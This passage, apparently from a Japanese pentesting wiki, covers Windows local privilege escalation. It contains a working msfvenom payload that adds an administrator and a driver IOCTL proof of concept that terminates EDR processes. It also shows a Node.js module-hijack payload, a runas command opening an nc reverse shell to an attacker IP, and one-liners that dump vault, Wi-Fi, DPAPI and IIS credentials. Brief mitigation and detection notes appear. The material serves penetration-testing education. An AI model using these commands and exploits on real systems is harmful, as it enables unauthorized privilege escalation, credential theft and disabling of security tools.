msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。このバイナリを置き換え可能な場合、privilege escalationが可能になることがあります。詳細については、[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## Applications

### Installed Applications

**バイナリのpermissions**（置き換えてprivilege escalationできる可能性があります）と、フォルダーの**permissions**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の設定ファイルを変更して特殊なファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認します。

システム内で権限の弱いフォルダーやファイルを見つける方法は次のとおりです。
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダー内にある任意の plugin DLL を自動ロードします。書き込み可能な portable/copy install が存在する場合、悪意のある plugin を配置することで、起動するたびに `notepad++.exe` 内で自動的に code execution が行われます（`DllMain` や plugin callbacks からの実行も含まれます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行される registry または binary の一部を上書きできるか確認します。**\
**以下のページ**を**読んで、privileges を escalate するために利用できる興味深い**autoruns locations**について詳しく学んでください:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の不審または脆弱な**drivers**の可能性を探します**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られるもの）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> step-by-step の technique はこちらを参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な call が attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅延させる（最大長の component や深い directory chain を使用する）ことで、window を microseconds から数十 microseconds まで引き延ばせます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

一部の Windows kernel LPE chain は、単体では弱い2つの bug から構築できます。1つは queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは `RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

Audit と exploitation に関する注意点：

- **Free-under-lock + cancel afterwards**: success path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達する場合、`NtCancelIoFileEx -> IopCsqCancelRoutine` で block されていた thread が後で再開し、解放済みの `PFLT_CALLBACK_DATA` を driver の remove callback に渡す可能性があります。
- 解放された queue object を、同じサイズの attacker-controlled な paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entries は payload と size を制御でき、後で pipe read/peek operations によって probe できるため便利です。解放された object が list link を埋め込んでいる場合は、それらを **user memory 内の fake request node の cyclic list** で上書きします。これにより、driver は元の list head で終了せず、attacker が定義した request structure を繰り返し処理します。
- **予測可能な write を upgrade する**: fake request が bookkeeping write（timestamps / QPC / refcount-adjacent fields）に使用される nested context pointer を redirect する場合、**address-controlled but not value-controlled** な kernel write を取得できる可能性があります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、その後 spray を列挙して、破壊された object から **out-of-bounds paged-pool read** が発生するものを探します。
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、いずれも有力な candidate です。attacker が copied buffer を拡大できる場合（たとえば、serializer の最終 allocation size を増加させる list/resource entry を多数追加するなど）、machine を必ずしも crash させずに、copy が長くなって replacement window が広がるため、reliability が向上します。
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer array は優れた disclosure target です。paged-pool size を attacker が制御でき（`8 * regBufferCnt`）、各 element は `_IOP_MC_BUFFER_ENTRY` への kernel pointer だからです。これらの array の1つを leak し、周辺の `IORING_OBJECT` を復元した後、**`RegBuffers`** と **`RegBuffersCount`** を corrupt します。これにより、後続の I/O ring operation が attacker-forged entry を使用し、arbitrary kernel read/write を提供するようになります。利用可能な write が stable byte しか提供しない場合（たとえば `KUSER_SHARED_DATA+0x14` から得られる値）、**overlapping unaligned write** を使用して `0x0101010101010101` のような repeated-byte user pointer を構築し、`VirtualAlloc` で map して、そこに forged registered-buffer array を配置します。<sup>[[30]](#references)</sup>

有用な debugging indicator：
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
corrupted I/O ring から arbitrary kernel read/write を取得したら、標準的な post-primitive workflow を使用して SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive の脆弱性では、決定論的なレイアウトを groom し、書き込み可能な HKLM/HKU descendants を悪用して、custom driver なしで metadata corruption を kernel paged-pool overflow に変換できます。完全な chain については、こちらを参照してください。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

一部の driver は userland から registry path を受け取り、それが正常な UTF-16 string であることだけを検証した後、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を `int readValue` のような stack scalar に対して `RTL_QUERY_REGISTRY_DIRECT` とともに呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は開発者が想定した type ではなく、**実際の** registry type に従って解釈されます。

これにより、2 つの有用な primitive が発生します:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path により、driver は攻撃者が選択した key を query でき、return code/log を通じて存在を leak し、場合によっては caller が直接アクセスできない value も読み取れます。
- **Kernel memory corruption**: `&readValue` のような scalar destination は、registry value type に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定された binary buffer として type-confused されます。

実際の exploitation に関する注意点:

- **Windows 8+ mitigation**: `RTL_QUERY_REGISTRY_DIRECT` を使用している query が **untrusted hive** に到達し、`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、`HKCU` 配下に value を staging するのではなく、**trusted system hives 内の attacker-writable keys** を探してください。
- **Trusted-hive staging**: NtObjectManager を使用して `\Registry\Machine` の writable descendants を列挙し、duplicated **low-integrity** token を使用して scan を再実行し、sandboxed contexts から到達可能な key を見つけます:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byte の `int` への 8-byte の direct write により、隣接する stack data が破壊され、近くの callback/function pointer が部分的に上書きされる可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode では、`EntryContext` が `UNICODE_STRING` を指していることを想定します。コードがまず攻撃者制御の `REG_DWORD` を stack scalar に読み込み、その後、同じ buffer を string read に再利用すると、攻撃者が `Length` / `MaximumLength` を制御し、`Buffer` pointer に部分的な影響を与えられるため、semi-controlled kernel write が発生します。
- **`REG_BINARY`**: large binary data の場合、direct mode は `EntryContext` にある最初の `LONG` を signed buffer size として扱います。以前の `REG_DWORD` read により、再利用された scalar に **negative** な攻撃者制御値が残っていると、次の `REG_BINARY` query によって攻撃者の bytes が隣接する stack slots に直接コピーされます。これは、多くの場合、callback-pointer overwrite を完全に達成する最も簡単な経路です。

強力な hunting pattern: **同じ stack variable への heterogeneous registry reads を、再初期化せずに行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される `EntryContext` pointers、および最初の registry read が 2 回目の read を実行するかどうかを制御する code path を grep します。

#### device objects で FILE_DEVICE_SECURE_OPEN の欠落を悪用する（LPE + EDR kill）

一部の signed third-party drivers は、IoCreateDeviceSecure によって強力な SDDL を設定して device object を作成しますが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れます。この flag がない場合、extra component を含む path 経由で device を開く際に secure DACL が強制されません。そのため、権限のない user でも、次のような namespace path を使用して handle を取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（実際の事例）

user が device を開けるようになると、driver が公開する privileged IOCTL を LPE や tampering に悪用できます。実際に確認された capabilities の例:
- 任意の process に対する full-access handles を返す（token theft / DuplicateTokenEx/CreateProcessAsUser による SYSTEM shell）。
- 制限のない raw disk read/write（offline tampering、boot-time persistence tricks）。
- Protected Process/Light（PP/PPL）を含む任意の process を terminate し、kernel 経由で user land から AV/EDR kill を可能にする。

最小限の PoC pattern（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けのMitigations
- DACLによる制限を意図したdevice objectsを作成する場合は、必ずFILE_DEVICE_SECURE_OPENを設定する。
- 特権操作を行う前に、caller contextを検証する。process terminationやhandle returnsを許可する前に、PP/PPL checksを追加する。
- IOCTLs（access masks、METHOD_*、input validation）を制限し、kernel privilegesへの直接アクセスではなく、brokered modelsの利用を検討する。

defenders向けのDetection ideas
- 疑わしいdevice names（例：\\ .\\amsdk*）に対するuser-mode opens、およびabuseを示す特定のIOCTL sequencesを監視する。
- Microsoftのvulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自のallow/deny listsを維持する。


## PATH DLL Hijacking

**PATH上に存在するフォルダ内へのwrite permissions**がある場合、processによってロードされるDLLをhijackし、**privilegesをescalate**できる可能性があります。

PATH内のすべてのフォルダのpermissionsを確認する：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron module resolution hijacking

これは、**Windows uncontrolled search path** の亜種であり、**Node.js** および **Electron** アプリケーションが、期待される module が **missing** の状態で `require("foo")` のような bare import を実行すると影響を受けます。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向にたどり、各親ディレクトリにある `node_modules` フォルダーを確認して package を解決します。Windows では、この探索が drive root まで到達する可能性があるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に以下を探索することがあります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user** が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package folder）を配置し、**higher-privileged Node/Electron process** が missing dependency を解決するのを待つことができます。payload は被害 process の security context で実行されるため、対象が administrator として実行されている場合、elevated scheduled task/service wrapper から実行されている場合、または auto-started privileged desktop app である場合、これは **LPE** になります。

これは、特に以下の場合によく発生します。

- dependency が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- third-party library が `require("foo")` を `try/catch` でラップし、失敗時も処理を継続する
- production build から package が削除された、packaging 時に省略された、または install に失敗した
- 脆弱な `require()` が main application code ではなく dependency tree の深い場所に存在する

### 脆弱な対象の Hunting

resolution path を証明するには **Procmon** を使用します。<sup>[[23]](#references)</sup>

- `Process Name` = target executable（`node.exe`、Electron app EXE、または wrapper process）でフィルターする
- `Path` `contains` `node_modules` でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功する open に注目する

unpacked `.asar` files または application sources で役立つ code-review patterns：
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **missing package name** を特定します。
2. まだ存在しない場合は、root lookup directory を作成します：
```powershell
mkdir C:\node_modules
```
3. 想定される正確な名前のモジュールを配置する：
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者アプリケーションを起動する。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに当てはまる、実際の missing optional modules の例としては `bluebird` や `utf-8-validate` があります。しかし、再利用可能な部分は **technique** です。つまり、特権 Windows Node/Electron プロセスが解決する、任意の **missing bare import** を見つけます。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルやパッケージを書き込んだりした場合に Alert を生成する。
- `C:\node_modules\*` から読み取っている high-integrity プロセスを Hunt する。
- 本番環境ではすべての runtime dependencies をパッケージ化し、`optionalDependencies` の使用状況を監査する。
- サードパーティーコード内の、`try { require("...") } catch {}` のような silent なパターンを確認する。
- ライブラリが対応している場合は optional probes を無効化する（たとえば、一部の `ws` deployments では `WS_NO_UTF_8_VALIDATE=1` により legacy の `utf-8-validate` probe を回避できる）。

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされている、その他の既知のコンピューターを確認します。
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースと DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から **制限されたサービス** を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドについては、このページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化など）**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)にもあります

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（初めて `nc.exe` を使用してポートを listen すると、`nc` を firewall で許可するかどうかを GUI で確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash を root として簡単に起動するには、`--default-user root` を試してください

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます

## Windows 認証情報

### Winlogon 認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault には、サーバー、Webサイト、その他のプログラムに対して **Windows** がユーザーを**自動的にログインさせる**ための認証情報が保存されます。初めは、ユーザーがFacebook、Twitter、Gmailなどの認証情報を保存して、ブラウザ経由で自動的にログインできるようにするものだと思うかもしれません。しかし、そうではありません。

Windows Vault には、Windows がユーザーを自動的にログインさせるための認証情報が保存されます。つまり、**リソースにアクセスするために認証情報が必要なWindowsアプリケーション**（サーバーまたはWebサイト）は、このCredential ManagerとWindows Vaultを利用し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションがCredential Managerと連携しない限り、特定のリソース用の認証情報を使用することはできないと思います。したがって、アプリケーションでvaultを利用する場合は、何らかの方法で **credential managerと通信し、そのリソースの認証情報をデフォルトのstorage vaultに要求する**必要があります。

`cmdkey` を使用して、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された認証情報を使用するために、`/savecred` オプションを付けて `runas` を使用できます。次の例では、SMB share 経由で remote binary を呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報セットで `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) から取得できます。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても公開されています）内に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` 権限なしでネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座に dump して復号できます:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** は、主に Windows オペレーティングシステム内で非対称秘密鍵を対称暗号化するために使用される、データの対称暗号化方式を提供します。この暗号化では、ユーザーまたはシステムの secret を利用して、エントロピーに大きく寄与します。

**DPAPI は、ユーザーのログイン secret から派生した対称鍵を使用して鍵を暗号化します**。システム暗号化の場合は、システムのドメイン認証 secret を使用します。

DPAPI を使用して暗号化されたユーザー RSA 鍵は、`{SID}` がユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表す `%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。**同じファイル内でユーザーの秘密鍵を保護する master key と同じ場所に保存される DPAPI key** は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用すると復号できます。

**master password で保護された credentials files** は、通常次の場所にあります。
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz module** `dpapi::cred` を適切な `/masterkey` とともに使用して復号できます。\
`sekurlsa::dpapi` module を使用すると、**memory** から多数の DPAPI **masterkeys** を **extract** できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。credentials は **DPAPI** を使用して保護されます。通常、作成されたのと同じコンピューター上の同じユーザーのみが復号できます。

それを含むファイルから PS credentials を **decrypt** するには、次のように実行します。
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
`/masterkey`を適切に指定して、**Mimikatz**の`dpapi::rdg`モジュールを使用し、**任意の.rdgファイルを復号**する\
**Mimikatz**の`sekurlsa::dpapi`モジュールを使用すると、メモリから**多数のDPAPI masterkeysを抽出**できる

### Sticky Notes

Windowsワークステーションでは、データベースファイルであることを知らずに、**パスワード**やその他の情報を保存するためにSticky Notesアプリが使われることがよくあります。このファイルは`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exeからパスワードを復元するには、Administratorであり、High Integrityレベルで実行する必要があることに注意してください。**\
**AppCmd.exe**は`%systemroot%\system32\inetsrv\`ディレクトリにあります。\
このファイルが存在する場合、何らかの**認証情報**が設定されており、**復元できる**可能性があります。

このコードは[**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)から抽出されました：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します .\
Installers は **SYSTEM privileges で実行されるため、** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc) **の情報によると、多くが** **DLL Sideloading** **に対して脆弱です。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（認証情報）

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されている可能性があるため、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用すれば簡単に復号できます。\
この technique の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が実行されておらず、boot 時に自動的に起動させたい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。`ssh-add` を使用して ssh keys をいくつか作成し、それらを追加して ssh 経由でマシンに login してみました。しかし、レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称 key authentication 中に `dpapi.dll` が使用されたことは確認できませんでした。

### 無人応答ファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
